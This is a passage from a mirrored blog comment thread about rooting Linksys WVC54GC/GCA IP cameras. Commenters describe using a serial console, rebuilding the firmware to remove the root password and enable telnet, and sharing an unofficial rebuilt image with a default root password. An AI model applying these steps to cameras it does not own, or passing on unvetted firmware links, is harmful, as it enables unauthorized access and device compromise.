+<p>The easiest way to do this is to get a CA-42 cellphone cable, which basically provides a USB to TTL serial convertor. You&#8217;ll also need to identify the pins on the circuit board that are the serial port. Most likely you&#8217;ll find a 4 or 5 pin header, or possibly an unpopulated header (just the holes). Identify which ones are ground using a multimeter, one will probably be 3V, and the others will be RX and TX.</p>
+<p>Once you have a console cable, you will be able to get a shell most likely, because very few manufacturers make you log in on the console.</p>
+<p>2. An alternative is to extract the cramfs filesystem from the firmware, mount it via loopback, copy everything off it into a new directory, delete root&#8217;s password and set up the telnet daemon to start automatically, then rebuild the cramfs and the firmware. Finally, flash your rebuilt firmware onto the camera.</p>
+<p>It should not be too difficult to figure out the firmware format, most likely it is the same as that used for the WRT54G and so forth.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-129182">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/27e52d3e4e67cd0afc696d5680872aee?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">L0RE</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129182">
+			October 6, 2010 at 6:54 pm</a>		</div>
+
+		<p>No Warenty,. You can Damage your Hardware.  Im Not Responsible&#8230; you know such stuff &#8230;. i compiled the last Firmware (1.00 R24) With telnet enabled and root password: toor</p>
+<p>Happy Linuxing :-). I would be happy Hearing from you</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-129183">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/27e52d3e4e67cd0afc696d5680872aee?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://rapidshare.com/files/423484428/WVC54GCA.bin' rel='external nofollow' class='url'>L0RE</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129183">
+			October 6, 2010 at 6:56 pm</a>		</div>
+
+		<p>Sorry i Forgot the most Important The Link <a href="http://rapidshare.com/files/423484428/WVC54GCA.bin" rel="nofollow">http://rapidshare.com/files/423484428/WVC54GCA.bin</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-129208">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0687cc834b4c73a8fb9c7dc8222f04ad?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">VaZso</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129208">
+			October 14, 2010 at 9:42 pm</a>		</div>
+
+		<p>@Rogan Dawes</p>
+<p>I have the latest firmware on my WVC54GC v1.1, which says &#8220;V1.26, Feb 03, 2008&#8243;. I&#8217;ve tried to re-pack the filesystem, but no luck. First, I&#8217;ve cut the first part of the firmware file (part1) until the filesystem (fs), then the last part (part2) of it. The filesystem itself is a cramfs file of 1511424 bytes. Info: &#8220;Linux Compressed ROM File System data, little endian size 1511424 version #2 sorted_dirs CRC 0x3a60d0db, edition 0, 777 blocks, 288 files&#8221;</p>
+<p>I&#8217;ve downloaded and compiled cramfs tools from here: <a href="http://sourceforge.net/projects/cramfs/" rel="nofollow">http://sourceforge.net/projects/cramfs/</a> For the fs, cramfsck tools says: &#8220;file inode has zero size and non-zero offset&#8221;</p>
+<p>&#8230;and it cannot extract whole of the data (just some of the files).</p>
+<p>I&#8217;ve mounted the filesystem as a loop device, copied to another directory, then re-packed it using mkcramfs (I&#8217;ve tried it also without any modifications, just with repacking).</p>
+<p>For the created file, file info says: &#8220;Linux Compressed ROM File System data, little endian size 1511424 version #2 sorted_dirs CRC 0x1b6023e1, edition 0, 777 blocks, 288 files&#8221; Finally, I&#8217;ve copied part1 + fs + part2 together. The file seemed to be correct, but when I&#8217;ve tried to upload it to the webcam, it said after a while: &#8220;Error: Upgrade file format error&#8221; I think the problem is the original cramfs on the device is somehow a bit modified version, or at least I don&#8217;t know what &#8220;file inode has zero size and non-zero offset&#8221; means or how can I make a suitable image for the device. Naturally, the fs begins on a different address in this firmware than the one was mentioned here. Has anybody any idea how to go on?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-129279">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/56f904629fb4ecda24ea08d0ee1ac199?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bruno</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129279">
+			November 14, 2010 at 7:59 pm</a>		</div>
+
+		<p>@LORE, would you be so kind and give us a short howto compile and build the firmware?</p>
+<p>That would be very helpful for me.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-129682">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b849691b80e6a43559c9f8f57e183a00?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">oliver</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129682">
+			January 26, 2011 at 11:25 am</a>		</div>
+
+		<p>I found that <a href="http://nurds-r-us.blogspot.com/" rel="nofollow">http://nurds-r-us.blogspot.com/</a> also was hacking around with this cam, and being curious about both camera&#8217;s mentioned I donwloaded both GPL source packages. Appearantly, linksys bought the IP from sercomm (sitecom) as their version of the package, albeit 125mb larger (i think toolchain sources are included), is filled with license files indicating that it is in fact, from sercomm.</p>
+<p>So the linksys cam is actually a sercomm cam.</p>
+<p>I suppose both gpl archives should be buildable and create a working binary that can be flashed.</p>
+<p>Browsing through both packages, it seems to all come from cadenux, a ucLinux specialist service.<br />
+Strangly, under userland/cron/ is a file called uClinux-dist-20020220.tar.gz (combined with some txt file about it) which probably should be there, and is the cause for the 175mb binary.</p>
+<p>Interestingly however is, that the sitecom GPL package has only left some binary object files for certain modules, gpio, led, switch etc, but the linksys version does include these files.<br />
+WiFi seems to be binary only for both unfortunatly, though personally i&#8217;d prefer a lan only version, ideally PoE.</p>
+<p>Just some food for thought.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-131713">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d582329c7d761296d319bc37eeea2b69?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">supbro</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-131713">
+			May 20, 2011 at 12:46 am</a>		</div>
+
+		<p>I installed LORE&#8217;s image on my WVC54GCA which had the latest official software, and now I have root! cool! But the rapidshare link he posted was no longer valid, here&#8217;s the one I used:</p>
+<p><a href="http://rapidshare.com/files/424551784/WVC54GCA.bin" rel="nofollow">http://rapidshare.com/files/424551784/WVC54GCA.bin</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="3019"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="c11a481044" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:22:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
